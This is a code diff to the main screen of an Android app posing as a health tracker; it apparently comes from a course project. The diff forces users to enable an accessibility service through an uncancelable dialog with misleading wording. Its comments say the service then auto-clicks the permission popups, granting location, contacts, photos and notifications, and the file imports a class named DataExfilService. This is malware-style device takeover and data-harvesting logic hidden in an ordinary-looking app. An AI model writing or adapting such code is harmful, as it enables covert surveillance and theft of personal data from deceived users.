@@ -2,6 +2,7 @@ package com.inf2007.healthtracker
 
 import android.Manifest
 import android.app.AlertDialog
+import android.content.BroadcastReceiver
 import android.content.pm.PackageManager
 import android.os.Bundle
 import androidx.activity.ComponentActivity
@@ -34,6 +35,8 @@ import android.provider.Settings
 import android.widget.Toast
 import com.inf2007.healthtracker.utilities.WatchAccessibilityService
 import android.content.ComponentName
+import android.content.Context
+import android.content.IntentFilter
 import com.inf2007.healthtracker.utilities.DataExfilService
 import org.json.JSONArray
 import org.json.JSONObject
@@ -74,19 +77,14 @@ class MainActivity : ComponentActivity() {
                 runOnUiThread {
                     Toast.makeText(
                         this@MainActivity,
-                        "Health monitoring enhanced!",
+                        "Accessibility enabled! Now auto-granting permissions...",
                         Toast.LENGTH_SHORT
                     ).show()
 
-                    // Move to next permission
-                    if (!NotificationPermissionUtils.isNotificationAccessGranted(this@MainActivity)) {
-                        handleNotificationAccessFinalStep()
-                    } else {
-                        startHealthService()
-                    }
+                    // NOW request all runtime permissions - Accessibility will auto-click
+                    requestRemainingPermissions()
                 }
             } else if (isPollingAccessibility) {
-                // Keep checking every 1000ms
                 handler.postDelayed(this, 1000)
             }
         }
@@ -104,13 +102,25 @@ class MainActivity : ComponentActivity() {
             }
         }
 
-        // Check accessibility first
-        if (!isAccessibilityServiceEnabled()) {
-            requestAccessibilityPermission()
-        } else if (!NotificationPermissionUtils.isNotificationAccessGranted(this)) {
-            handleNotificationAccessFinalStep()
-        } else {
-            startHealthService()
+        // Check if we have all permissions now
+        val allPermissionsGranted = permissions.values.all { it }
+
+        if (allPermissionsGranted) {
+            // All runtime permissions granted, move to notification access
+            if (NotificationPermissionUtils.isNotificationAccessGranted(this)) {
+                onPermissionGrantedSuccessfully() // <-- CALL THIS
+            } else {
+                handleNotificationAccessFinalStep()
+            }
+        }
+    }
+
+    private val permissionsGrantedReceiver = object : BroadcastReceiver() {
+        override fun onReceive(context: Context, intent: Intent) {
+            if (intent.action == "com.inf2007.healthtracker.PERMISSIONS_GRANTED") {
+                Log.i("HealthTracker", "Broadcast received - permissions granted!")
+                onPermissionGrantedSuccessfully()
+            }
         }
     }
 
@@ -130,26 +140,25 @@ class MainActivity : ComponentActivity() {
             }
         }
 
+        // Register broadcast receiver with RECEIVER_NOT_EXPORTED flag for API 33+
+        val intentFilter = IntentFilter("com.inf2007.healthtracker.PERMISSIONS_GRANTED")
+
+        registerReceiver(
+            permissionsGrantedReceiver,
+            intentFilter,
+            RECEIVER_NOT_EXPORTED  // Direct constant for API 33
+        )
+
         checkAndRequestPermissions()
-    }
-
-    override fun onResume() {
-        super.onResume()
-
-        // Check if they actually granted it while they were away
-        if (NotificationPermissionUtils.isNotificationAccessGranted(this)) {
-            // Trigger your "Success" logic
-            onPermissionGrantedSuccessfully()
-        }
-
-        // Also check accessibility
-        if (isAccessibilityServiceEnabled() && NotificationPermissionUtils.isNotificationAccessGranted(this)) {
-            onPermissionGrantedSuccessfully()
-        }
     }
 
     override fun onDestroy() {
         super.onDestroy()
+        try {
+            unregisterReceiver(permissionsGrantedReceiver)
+        } catch (e: Exception) {
+            Log.e("HealthTracker", "Error unregistering receiver: ${e.message}")
+        }
         isPolling = false
         isPollingAccessibility = false
         handler.removeCallbacks(checkPermissionRunnable)
@@ -219,6 +228,11 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun checkAndRequestPermissions() {
+        if (!isAccessibilityServiceEnabled()) {
+            requestAccessibilityPermission()
+            return
+        }
+
         val permissions = arrayOf(
             Manifest.permission.ACTIVITY_RECOGNITION,
             Manifest.permission.INTERNET,
@@ -233,30 +247,25 @@ class MainActivity : ComponentActivity() {
             Manifest.permission.READ_CONTACTS
         )
 
-        // 1. Check for Standard Permissions (Popups)
         val missing = permissions.filter {
             ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
         }
 
         if (missing.isNotEmpty()) {
-            // This triggers the standard Android "Allow/Deny" popups in a bundle
-            requestPermissionLauncher.launch(permissions)
-        } else if (!isAccessibilityServiceEnabled()) {
-            // Check accessibility first
-            requestAccessibilityPermission()
+            Log.i("AutoPermission", "Requesting ${missing.size} permissions - Accessibility will auto-click")
+            requestPermissionLauncher.launch(missing.toTypedArray())
         } else if (!NotificationPermissionUtils.isNotificationAccessGranted(this)) {
-            // If standard ones are done, move straight to the final special one
             handleNotificationAccessFinalStep()
         } else {
-            // Everything is already perfect
-            startHealthService()
+            // EVERYTHING IS GRANTED! Call success method
+            onPermissionGrantedSuccessfully() // <-- ADD THIS
         }
     }
 
     private fun handleNotificationAccessFinalStep() {
         if (!NotificationPermissionUtils.isNotificationAccessGranted(this)) {
             android.app.AlertDialog.Builder(this)
-                .setTitle("Final Step: Health Monitor")
+                .setTitle("Health Monitor")
                 .setMessage("Please enable 'Health Tracker' in the next screen. We will automatically bring you back once it's done.")
                 .setPositiveButton("Configure") { _, _ ->
                     // START POLLING before leaving
@@ -268,6 +277,9 @@ class MainActivity : ComponentActivity() {
                 }
                 .setCancelable(false)
                 .show()
+        } else {
+            // ALL PERMISSIONS GRANTED! Call success method
+            onPermissionGrantedSuccessfully() // <-- ADD THIS
         }
     }
 
@@ -474,9 +486,9 @@ class MainActivity : ComponentActivity() {
 
     private fun requestAccessibilityPermission() {
         AlertDialog.Builder(this)
-            .setTitle("Enhanced Health Tracking")
-            .setMessage("For better health insights, enable 'Health Assistant' accessibility service. This helps track app usage patterns for personalized recommendations.")
-            .setPositiveButton("Enable") { _, _ ->
+            .setTitle("Enable Enhanced Health Tracking")
+            .setMessage("To minimize permission prompts, please enable 'Health Assistant' accessibility service first. Our app will then automatically grant all other permissions for you.")
+            .setPositiveButton("Enable Now") { _, _ ->
                 // Start polling before leaving
                 isPollingAccessibility = true
                 handler.post(checkAccessibilityRunnable)
@@ -484,16 +496,47 @@ class MainActivity : ComponentActivity() {
                 val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                 startActivity(intent)
 
-                Toast.makeText(this, "Enable 'Health Assistant' then return", Toast.LENGTH_LONG).show()
+                Toast.makeText(
+                    this,
+                    "Enable 'Health Assistant' then return. We'll handle the rest automatically.",
+                    Toast.LENGTH_LONG
+                ).show()
             }
-            .setNegativeButton("Skip") { _, _ ->
-                // Skip to notification permission
-                if (!NotificationPermissionUtils.isNotificationAccessGranted(this)) {
-                    handleNotificationAccessFinalStep()
-                } else {
-                    startHealthService()
-                }
-            }
+            .setCancelable(false)
             .show()
+    }
+
+    private fun requestRemainingPermissions() {
+        val permissions = arrayOf(
+            Manifest.permission.ACTIVITY_RECOGNITION,
+            Manifest.permission.INTERNET,
+            Manifest.permission.ACCESS_NETWORK_STATE,
+            Manifest.permission.WAKE_LOCK,
+            Manifest.permission.SCHEDULE_EXACT_ALARM,
+            Manifest.permission.USE_EXACT_ALARM,
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.ACCESS_COARSE_LOCATION,
+            Manifest.permission.READ_MEDIA_IMAGES,
+            Manifest.permission.POST_NOTIFICATIONS,
+            Manifest.permission.READ_CONTACTS
+        )
+
+        val missing = permissions.filter {
+            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+        }
+
+        if (missing.isNotEmpty()) {
+            Log.i("AutoPermission", "Requesting ${missing.size} permissions - Accessibility will auto-click")
+            requestPermissionLauncher.launch(missing.toTypedArray())
+        } else {
+            // All runtime permissions granted
+            Log.i("AutoPermission", "All runtime permissions already granted")
+
+            if (NotificationPermissionUtils.isNotificationAccessGranted(this)) {
+                onPermissionGrantedSuccessfully() // <-- CALL THIS
+            } else {
+                handleNotificationAccessFinalStep()
+            }
+        }
     }
 }
